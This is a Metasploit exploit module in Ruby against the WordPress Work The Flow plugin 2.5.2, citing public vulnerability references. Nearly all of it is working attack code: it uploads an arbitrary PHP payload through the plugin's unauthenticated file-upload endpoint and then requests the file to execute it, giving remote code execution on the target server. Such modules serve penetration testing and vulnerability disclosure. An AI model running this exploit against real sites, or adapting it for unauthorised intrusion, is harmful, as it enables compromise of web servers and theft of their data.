##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::HTTP::Wordpress
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Wordpress Work The Flow Upload Vulnerability',
      'Description'    => %q{
        This module exploits an arbitrary PHP code upload in the WordPress Work The Flow plugin,
        version 2.5.2. The vulnerability allows for arbitrary file upload and remote code execution.
      },
      'Author'         =>
        [
          'Claudio Viviani', # Vulnerability discovery
          'Roberto Soares Espreto <robertoespreto[at]gmail.com>'  # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['WPVDB', '7883'],
          ['EDB', '36640'],
          ['URL', 'http://packetstormsecurity.com/files/131294/WordPress-Work-The-Flow-2.5.2-Shell-Upload.html']
        ],
      'Privileged'     => false,
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Targets'        => [['Work The Flow 2.5.2', {}]],
      'DisclosureDate' => 'Mar 14 2015',
      'DefaultTarget'  => 0)
    )
  end

  def check
    check_plugin_version_from_readme('work-the-flow-file-upload', '2.5.4')
  end

  def exploit
    php_pagename = rand_text_alpha(8 + rand(8)) + '.php'

    data = Rex::MIME::Message.new
    data.add_part('upload', nil, nil, 'form-data; name="action"')
    data.add_part(payload.encoded, 'application/octet-stream', nil, "form-data; name=\"files\"; filename=\"#{php_pagename}\"")
    post_data = data.to_s

    res = send_request_cgi({
      'uri'       => normalize_uri(wordpress_url_plugins, 'work-the-flow-file-upload', 'public', 'assets',
                                   'jQuery-File-Upload-9.5.0', 'server', 'php', 'index.php'),
      'method'    => 'POST',
      'ctype'     => "multipart/form-data; boundary=#{data.bound}",
      'data'      => post_data
    })

    if res
      if res.code == 200
        print_good("#{peer} - Our payload is at: #{php_pagename}. Calling payload...")
        register_files_for_cleanup(php_pagename)
      else
        fail_with(Failure::UnexpectedReply, "#{peer} - Unable to deploy payload, server returned #{res.code}")
      end
    else
      fail_with(Failure::Unknown, 'ERROR')
    end

    print_status("#{peer} - Calling payload...")
    send_request_cgi(
      'uri'       => normalize_uri(wordpress_url_plugins, 'work-the-flow-file-upload', 'public', 'assets',
                                   'jQuery-File-Upload-9.5.0', 'server', 'php', 'files', php_pagename)
    )
  end
end